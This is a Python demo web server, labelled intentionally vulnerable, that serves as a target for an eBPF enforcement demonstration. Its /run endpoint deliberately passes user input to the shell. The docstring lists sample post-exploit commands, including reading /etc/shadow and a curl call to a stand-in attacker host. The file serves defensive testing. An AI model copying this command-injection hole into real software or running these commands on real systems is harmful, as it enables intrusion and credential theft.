#!/usr/bin/env python3
"""Intentionally vulnerable demo web app — command-injection / RCE (the same
class as SSTI / command-injection CVEs). Stdlib only, no
pip, so it profiles cleanly and starts instantly.

*** DO NOT DEPLOY. This is a live target for the ebpf-mon enforcement demo. ***

Legit endpoints (exercise these while profiling):
  GET /            -> liveness "ok"
  GET /health      -> reads /app/config.txt and returns it (a legit file read)

Vulnerable endpoint (the "exploit"):
  GET /run?cmd=... -> passes attacker input straight to the shell (RCE)

Post-exploitation via /run maps 1:1 onto the three enforcement categories:
  cmd=id                       -> spawns /bin/sh (EXEC)   -> bprm_check denies
  cmd=cat /etc/shadow          -> shell + secret READ     -> file_open denies
  cmd=curl http://attacker...  -> shell + EGRESS          -> socket_connect denies
The Java/Python app never runs a shell during normal work, so default-deny
blocks every post-exploit step while / and /health keep serving.
"""
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(body.encode(errors="replace"))

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/":
            self._send(200, "ok\n")
        elif u.path == "/health":
            try:
                with open("/app/config.txt") as f:
                    self._send(200, f.read())
            except OSError as e:
                self._send(500, f"{e}\n")
        elif u.path == "/run":
            cmd = parse_qs(u.query).get("cmd", [""])[0]
            # THE VULNERABILITY: attacker-controlled string reaches the shell.
            # Hard timeout so a hanging reverse-shell probe cannot wedge the
            # single-threaded demo server on stage.
            try:
                out = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=4,
                ).decode(errors="replace")
            except subprocess.TimeoutExpired:
                out = "(timed out)\n"
            except subprocess.CalledProcessError as e:
                out = (e.output or b"").decode(errors="replace")
            self._send(200, out)
        else:
            self._send(404, "not found\n")

    def log_message(self, *_):
        pass  # keep the profiling output clean


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
